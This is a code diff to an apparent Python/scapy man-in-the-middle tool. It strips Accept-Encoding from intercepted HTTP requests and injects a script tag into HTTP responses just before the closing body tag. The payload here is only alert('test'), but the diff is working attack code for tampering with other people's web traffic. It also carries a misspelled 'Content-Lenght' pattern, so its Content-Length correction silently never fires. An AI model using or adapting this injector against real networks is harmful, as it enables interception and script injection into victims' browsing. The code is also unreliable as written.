@@ -14,11 +14,17 @@ def process_packet(packet):
             load = scapy_packet[scapy.Raw].load
             if scapy_packet[scapy.TCP].dport == 80:  # Check for outgoing requests
                 print ("[+] Request ")
-                load = re.sub("Accept-Encoding:.*?\\r\\n"," ",load)
+                load = re.sub("Accept-Encoding:.*?\\r\\n","",load)
             elif scapy_packet[scapy.TCP].sport == 80:  # Check for incoming responses
                 print("[+] Response ")
-                print(scapy_packet.show())
-                load =load.replace("</body","<script>alert('test');</script></body>")
+                injection_code = "<script>alert('test');</script>"
+                load = load.replace ("</body>",injection_code + "</body>")
+                #print(scapy_packet.show())
+                content_length_search = re.search("(?:Content-Lenght:\s)(\d*)",load)
+                if content_length_search:
+                    content_length = content_length_search.group(1)
+                    new_content_lenght =int(content_length) + len(injection_code)
+                    load = load.replace(content_length,str(new_content_lenght))
             if load != scapy_packet[scapy.Raw].load :
                 new_packet = set_load(scapy_packet,load)
                 packet.set_payload(bytes(new_packet))  # Set the modified packet payload
